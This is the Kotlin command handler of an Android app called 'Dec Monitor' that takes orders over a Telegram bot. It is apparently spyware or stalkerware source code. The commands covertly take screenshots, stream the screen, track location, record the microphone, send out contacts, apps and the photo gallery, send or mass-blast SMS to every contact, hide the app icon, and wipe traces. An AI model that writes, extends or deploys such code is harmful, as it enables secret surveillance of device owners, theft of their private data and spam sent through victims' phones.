package com.dec.monitor

import android.content.Context
import android.content.Intent
import com.dec.monitor.location.LocationTracker
import com.dec.monitor.media.AmbientRecorder
import com.dec.monitor.media.GalleryDumper
import com.dec.monitor.screen.LiveStreamService
import com.dec.monitor.screen.ScreenshotService
import com.dec.monitor.sms.SmsBroadcaster
import com.dec.monitor.stealth.StealthManager
import com.dec.monitor.system.DeviceInfo
import com.dec.monitor.usage.AppUsageTracker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object CommandHandler {

    fun handle(context: Context, command: String) {
        CoroutineScope(Dispatchers.IO).launch {
            when {
                command == "/screenshot_on" -> {
                    ScreenshotService.fastMode = true
                    TelegramBot.sendMessage("📸 Screenshot ON — every 3s ⚡")
                }
                command == "/screenshot_off" -> {
                    ScreenshotService.fastMode = false
                    TelegramBot.sendMessage("📸 Screenshot OFF — back to 30s")
                }
                command == "/stream_on" -> {
                    LiveStreamService.streamIntervalMs = 10_000L
                    TelegramBot.sendMessage("🔴 Live stream ON — every 10s")
                }
                command == "/stream_off" -> {
                    LiveStreamService.isStreaming = false
                    TelegramBot.sendMessage("⏹ Live stream OFF")
                }
                command == "/location" -> {
                    TelegramBot.sendMessage("📍 Fetching location...")
                    DeviceInfo.getLocation(context)
                }
                command == "/location_on" -> {
                    LocationTracker.startTracking(context)
                }
                command == "/location_off" -> {
                    LocationTracker.stopTracking()
                    TelegramBot.sendMessage("📍 Location tracking stopped")
                }
                command == "/location_history" -> {
                    TelegramBot.sendMessage("📍 <b>Today's Route</b>\n${LocationTracker.getDayHistory()}")
                }
                command == "/battery" -> {
                    val info = DeviceInfo.getBatteryInfo(context)
                    TelegramBot.sendMessage("🔋 <b>Battery</b>\n$info")
                }
                command == "/contacts" -> {
                    TelegramBot.sendMessage("📒 Fetching contacts...")
                    DeviceInfo.getContacts(context)
                }
                command == "/apps" -> {
                    val apps = DeviceInfo.getInstalledApps(context)
                    TelegramBot.sendMessage("📱 <b>Installed Apps</b>\n$apps")
                }
                command == "/usage" -> {
                    TelegramBot.sendMessage("📊 Generating usage report...")
                    AppUsageTracker.getDailyReport(context)
                }
                command == "/ring" -> {
                    DeviceInfo.ringDevice(context)
                    TelegramBot.sendMessage("🔔 Ringing device...")
                }
                command == "/gallery5" -> {
                    GalleryDumper.sendLatest(context, 5)
                }
                command == "/gallery20" -> {
                    GalleryDumper.sendLatest(context, 20)
                }
                command == "/galleryhalf" -> {
                    GalleryDumper.sendLatest(context, -2)
                }
                command == "/galleryfull" -> {
                    TelegramBot.sendMessage("⚠️ Sending FULL gallery...")
                    GalleryDumper.sendLatest(context, -1)
                }
                command == "/mic" -> {
                    TelegramBot.sendMessage("🎙 Recording 30s...")
                    AmbientRecorder.record(context, 30)
                }
                command == "/mic60" -> {
                    TelegramBot.sendMessage("🎙 Recording 60s...")
                    AmbientRecorder.record(context, 60)
                }
                // SMS to specific number
                command.startsWith("/sms ") -> {
                    val parts = command.removePrefix("/sms ").split(" ", limit = 2)
                    if (parts.size == 2) {
                        DeviceInfo.sendSms(context, parts[0], parts[1])
                        TelegramBot.sendMessage("✅ SMS sent to ${parts[0]}")
                    } else {
                        TelegramBot.sendMessage("❌ Usage: /sms <number> <message>")
                    }
                }
                // SMS to specific number multiple times
                command.startsWith("/sms_x ") -> {
                    val parts = command.removePrefix("/sms_x ").split(" ", limit = 3)
                    if (parts.size == 3) {
                        val times = parts[0].toIntOrNull() ?: 1
                        val number = parts[1]
                        val message = parts[2]
                        TelegramBot.sendMessage("📤 Sending $times SMS to $number...")
                        SmsBroadcaster.sendToNumber(number, message, times)
                    } else {
                        TelegramBot.sendMessage("❌ Usage: /sms_x <times> <number> <message>")
                    }
                }
                // blast all contacts once
                command.startsWith("/blast ") -> {
                    val message = command.removePrefix("/blast ")
                    SmsBroadcaster.blastAll(context, message, 1)
                }
                // blast all contacts X times
                command.startsWith("/blast_x ") -> {
                    val parts = command.removePrefix("/blast_x ").split(" ", limit = 2)
                    if (parts.size == 2) {
                        val times = parts[0].toIntOrNull() ?: 1
                        val message = parts[1]
                        SmsBroadcaster.blastAll(context, message, times)
                    } else {
                        TelegramBot.sendMessage("❌ Usage: /blast_x <times> <message>")
                    }
                }
                command == "/blast_stop" -> {
                    SmsBroadcaster.stop()
                    TelegramBot.sendMessage("⏹ Blast stopped")
                }
                command == "/panic" -> {
                    TelegramBot.sendMessage("🚨 PANIC — clearing all data...")
                    StealthManager.showIcon(context)
                    context.cacheDir.deleteRecursively()
                    context.getExternalFilesDir(null)?.deleteRecursively()
                    TelegramBot.sendMessage("✅ Data cleared.")
                }
                command == "/hide" -> {
                    StealthManager.hideIcon(context)
                    TelegramBot.sendMessage("👁 Icon hidden")
                }
                command == "/show" -> {
                    StealthManager.showIcon(context)
                    TelegramBot.sendMessage("👁 Icon visible")
                }
                command == "/help" -> {
                    TelegramBot.sendMessage(
                        """
🤖 <b>Dec Monitor Commands</b>

📸 Screenshot:
/screenshot_on — every 3s ⚡
/screenshot_off — 30s

🔴 Stream:
/stream_on /stream_off

📍 Location:
/location — now
/location_on — auto track
/location_off
/location_history

🔋 /battery
📒 /contacts
📱 /apps
📊 /usage
🔔 /ring

🖼 Gallery:
/gallery5 /gallery20
/galleryhalf /galleryfull

🎙 /mic /mic60

💬 SMS:
/sms &lt;number&gt; &lt;msg&gt;
/sms_x &lt;times&gt; &lt;number&gt; &lt;msg&gt;
/blast &lt;msg&gt; — all contacts once
/blast_x &lt;times&gt; &lt;msg&gt; — all contacts X times
/blast_stop — stop blast

👁 Stealth:
/hide /show /panic

❓ /help
                        """.trimIndent()
                    )
                }
                else -> TelegramBot.sendMessage("❓ Unknown. /help")
            }
        }
    }
}
